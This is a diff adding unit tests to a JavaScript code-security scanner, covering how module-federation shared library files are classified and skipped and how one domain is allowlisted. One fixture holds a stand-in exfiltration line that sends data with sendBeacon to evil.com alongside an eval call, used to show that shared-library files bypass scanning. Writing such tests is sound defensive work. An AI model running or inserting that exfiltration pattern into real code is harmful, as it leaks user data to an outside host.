@@ -1,5 +1,6 @@
 import { describe, it, expect } from 'vitest'
 import { analyzeCodeSecurity } from '../src/analyzer.js'
+import { CodeSecurityService } from '../src/index.js'
 import { adjustViolationSeverity, determineFileContext } from '../src/utils/file-context.js'
 import type { FileContext } from '../src/types.js'
 
@@ -625,6 +626,29 @@ describe('adjustViolationSeverity - ファイルコンテキスト別の抑制',
       expect(context.isUserCode).toBe(true)
       expect(context.isBundledDependency).toBe(false)
     })
+
+    it.each([
+      ['react', '__federation_shared_react-abc123.js'],
+      ['react/jsx-runtime', '__federation_shared_react/jsx-runtime-abc123.js'],
+      ['react-dom', '__federation_shared_react-dom-abc123.js'],
+      ['react-dom/client', '__federation_shared_react-dom/client-abc123.js'],
+      ['three', '__federation_shared_three-abc123.js'],
+      ['three/addons', '__federation_shared_three/addons-B-heIOzx.js'],
+      ['@react-three/fiber', '__federation_shared_@react-three/fiber-abc123.js'],
+      ['@react-three/drei', '__federation_shared_@react-three/drei-abc123.js'],
+      ['@react-three/rapier', '__federation_shared_@react-three/rapier-abc123.js'],
+      ['@xrift/world-components', '__federation_shared_@xrift/world-components-abc123.js'],
+    ])('%s は共有ライブラリとして判定される', (_pkg, path) => {
+      const context = determineFileContext(path)
+      expect(context.isSharedLibrary).toBe(true)
+      expect(context.isBundledDependency).toBe(false)
+    })
+
+    it('未知の __federation_shared_ パッケージは共有ライブラリとして判定されない', () => {
+      const context = determineFileContext('__federation_shared_unknown-pkg-abc123.js')
+      expect(context.isSharedLibrary).toBe(false)
+      expect(context.isBundledDependency).toBe(true)
+    })
   })
 })
 
@@ -992,5 +1016,54 @@ describe('バイパスパターン検出の強化', () => {
 
       expect(signals.detectedViolations.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
     })
+  })
+})
+
+describe('Issue #25 - 共有ライブラリのスキャンスキップ', () => {
+  const service = new CodeSecurityService()
+
+  it('__federation_shared_* ファイルはスキャンされず valid: true を返す', () => {
+    const code = `
+      eval("malicious code")
+      navigator.sendBeacon("https://evil.com", data)
+    `
+    const context: FileContext = {
+      filePath: '__federation_shared_three-addons-B-heIOzx.js',
+      isUserCode: false,
+      isSharedLibrary: true,
+      isBundledDependency: false,
+    }
+
+    const result = service.validate({ code, fileContext: context })
+
+    expect(result.valid).toBe(true)
+    expect(result.violations.critical).toHaveLength(0)
+    expect(result.violations.warnings).toHaveLength(0)
+  })
+
+  it('バンドル依存ファイルは引き続きスキャンされる', () => {
+    const code = `eval("malicious")`
+    const context: FileContext = {
+      filePath: 'some-lib-abc123.js',
+      isUserCode: false,
+      isSharedLibrary: false,
+      isBundledDependency: true,
+    }
+
+    const result = service.validate({ code, fileContext: context })
+
+    expect(result.valid).toBe(false)
+  })
+})
+
+describe('Issue #25 - immersiveweb.dev は許可ドメイン', () => {
+  it('.src に immersiveweb.dev の URL を代入しても違反にならない', () => {
+    const code = `
+      img.src = 'https://immersiveweb.dev/ar-module/'
+    `
+
+    const signals = analyzeCodeSecurity(code)
+
+    expect(signals.detectedViolations.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
   })
 })
